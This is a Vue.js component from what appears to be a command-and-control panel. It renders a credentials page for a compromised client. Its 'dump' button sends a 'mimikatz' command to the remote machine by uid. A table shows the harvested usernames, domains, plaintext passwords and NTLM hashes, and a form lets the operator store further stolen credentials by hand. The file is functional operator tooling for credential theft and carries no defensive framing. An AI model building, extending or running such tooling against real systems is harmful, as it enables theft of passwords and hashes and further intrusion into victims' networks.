<template>
  <div class="creds-container">
    <el-card shadow="never" class="toolbar-card">
      <div class="toolbar-content">
        <h2 class="toolbar-title">{{ t('credentials.title') }}</h2>
        <div class="toolbar-actions">
          <el-button type="primary" @click="dialogVisible = true">
            {{ t('cred.add') }}
          </el-button>
          <el-button type="danger" @click="runMimikatz" :loading="dumping" :disabled="dumping">
            {{ dumping ? t('cred.dumping') : t('cred.dump') }}
          </el-button>
        </div>
      </div>
    </el-card>

    <el-card shadow="never" style="margin-top: 16px">
      <el-table :data="credentials" v-loading="loading" stripe style="width: 100%">
        <el-table-column prop="username" :label="t('credentials.username')" min-width="140" />
        <el-table-column prop="target" :label="t('cred.domain')" min-width="120" />
        <el-table-column prop="secret" :label="t('credentials.secret')" min-width="220">
          <template #default="{ row }">
            <el-tag :type="row.cred_type === 'password' ? 'warning' : 'danger'" style="font-family: monospace; word-break: break-all">
              {{ row.secret }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="cred_type" :label="t('credentials.type')" width="90">
          <template #default="{ row }">
            <el-tag :type="row.cred_type === 'password' ? 'success' : 'info'" size="small">
              {{ row.cred_type === 'password' ? t('cred.plaintext') : 'Hash' }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="source" :label="t('credentials.source')" width="120" />
        <el-table-column prop="created_at" :label="t('credentials.time')" width="170">
          <template #default="{ row }">
            {{ new Date(row.created_at * 1000).toLocaleString() }}
          </template>
        </el-table-column>
        <el-table-column :label="t('common.actions')" width="80" fixed="right">
          <template #default="{ row }">
            <el-button type="danger" size="small" @click="handleDelete(row)">{{ t('common.delete') }}</el-button>
          </template>
        </el-table-column>
      </el-table>
    </el-card>

    <el-dialog v-model="dialogVisible" :title="t('cred.add')" width="500px">
      <el-form :model="form" label-width="80px">
        <el-form-item :label="t('credentials.username')">
          <el-input v-model="form.username" :placeholder="t('credentials.username')" />
        </el-form-item>
        <el-form-item :label="t('cred.domain')">
          <el-input v-model="form.target" :placeholder="t('cred.domainPh')" />
        </el-form-item>
        <el-form-item :label="t('credentials.secret')">
          <el-input v-model="form.secret" type="textarea" :rows="2" :placeholder="t('cred.secretPh')" />
        </el-form-item>
        <el-form-item :label="t('credentials.type')">
          <el-radio-group v-model="form.cred_type">
            <el-radio label="password">{{ t('cred.plaintext') }}</el-radio>
            <el-radio label="hash">NTLM Hash</el-radio>
          </el-radio-group>
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="dialogVisible = false">{{ t('common.cancel') }}</el-button>
        <el-button type="primary" :loading="saving" @click="handleAdd">{{ t('common.save') }}</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { useI18n } from 'vue-i18n'
const { t } = useI18n()
import { ref, onMounted } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { useRoute } from "vue-router"
import ClientAPI from '@/api/clients'
import CredentialsAPI from '@/api/credentials'

const route = useRoute()
const credentials = ref([])
const loading = ref(false)
const dumping = ref(false)
const saving = ref(false)
const dialogVisible = ref(false)
const form = ref({ username: '', target: '', secret: '', cred_type: 'password' })

const fetchCredentials = async () => {
  loading.value = true
  try {
    const res = await CredentialsAPI.list()
    if (res.data.status === 200) {
      const uid = route.query.uid
      credentials.value = (res.data.data || []).filter(c => c.uid === uid)
    }
  } finally {
    loading.value = false
  }
}

const runMimikatz = async () => {
  dumping.value = true
  try {
    const res = await ClientAPI.send_commands({ uid: route.query.uid, command: 'mimikatz' })
    if (res.data.status === 200) {
      ElMessage.success(t('cred.dumpCmdSent'))
    } else {
      ElMessage.warning(res.data.msg || t('cred.dumpFailed'))
    }
  } catch {
    ElMessage.error(t('shell.cmdSendFailed'))
  } finally {
    dumping.value = false
  }
  setTimeout(fetchCredentials, 5000)
}

const handleAdd = async () => {
  if (!form.value.username || !form.value.secret) {
    ElMessage.warning(t('cred.userPwdRequired'))
    return
  }
  saving.value = true
  try {
    const res = await CredentialsAPI.add({
      uid: route.query.uid,
      target: form.value.target,
      username: form.value.username,
      secret: form.value.secret,
      cred_type: form.value.cred_type,
      source: 'manual',
      notes: '',
    })
    if (res.data.status === 200) {
      ElMessage.success(t('cred.added'))
      dialogVisible.value = false
      form.value = { username: '', target: '', secret: '', cred_type: 'password' }
      await fetchCredentials()
    }
  } catch {
    ElMessage.error(t('common.addFailed'))
  } finally {
    saving.value = false
  }
}

const handleDelete = async (row) => {
  try {
    await ElMessageBox.confirm(t('credentials.deleteConfirm'), t('common.notice'))
    const res = await CredentialsAPI.delete(row.id)
    if (res.data.status === 200) {
      ElMessage.success(t('common.deleted'))
      await fetchCredentials()
    }
  } catch {
    // cancelled
  }
}

onMounted(fetchCredentials)
</script>

<style scoped>
.creds-container { padding: 16px; }
.toolbar-card { margin-bottom: 0; }
.toolbar-content { display: flex; justify-content: space-between; align-items: center; }
.toolbar-title { margin: 0; font-size: 18px; font-weight: 600; }
.toolbar-actions { display: flex; gap: 8px; }
.el-dialog .el-input__wrapper input,
.el-dialog .el-textarea__inner { color: #333 !important; }
</style>
